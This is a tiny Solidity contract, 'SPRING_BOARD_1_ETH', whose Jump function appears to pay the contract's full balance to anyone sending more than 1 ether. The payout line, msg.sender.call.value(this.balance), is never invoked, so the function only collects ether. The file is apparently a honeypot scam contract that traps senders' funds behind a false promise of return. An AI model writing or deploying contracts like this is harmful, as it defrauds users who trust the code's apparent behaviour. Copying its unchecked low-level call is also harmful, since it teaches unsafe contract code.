// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract SPRING_BOARD_1_ETH {

    function Jump() public payable {
        if(msg.value > 1 ether) {
            msg.sender.call.value(this.balance);
        }
    }
}
